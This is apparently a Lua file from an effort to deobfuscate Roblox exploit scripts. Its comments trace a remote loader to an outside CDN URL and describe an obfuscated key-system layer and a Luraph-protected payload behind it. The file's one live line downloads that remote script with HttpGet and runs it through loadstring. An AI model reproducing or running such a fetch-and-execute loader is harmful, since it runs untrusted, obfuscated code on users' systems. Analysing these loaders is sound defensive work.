-- Deobfuscated from Scripts/Skids/Universal 2/Dirty/Main.lua
-- Original wrapper: remote loadstring.
-- Source recovered from:
-- https://api.jnkie.com/api/v1/luascripts/public/8e4ea2929a44f8c8caa9590791acd914d892c445c7f8ae2f144f0325a3a699f6/download
--
-- The API redirects to:
-- https://cdn.jnkie.com/f582e2e54ce6d6fa356dbb1c30bc7f592f140fdcb73e6f1680a0ee276eec5681.lua
--
-- Recovered second-stage source is saved beside this file as Clean/Loadstring.lua.
-- That second stage contains a WeAreDevs VM-obfuscated key-system layer followed
-- by a Luraph-protected payload tail. See Clean/WrdLayer.lua and the recovery
-- report for the recovered network behavior.

local sourceUrl = "https://cdn.jnkie.com/f582e2e54ce6d6fa356dbb1c30bc7f592f140fdcb73e6f1680a0ee276eec5681.lua"

return loadstring(game:HttpGet(sourceUrl))()
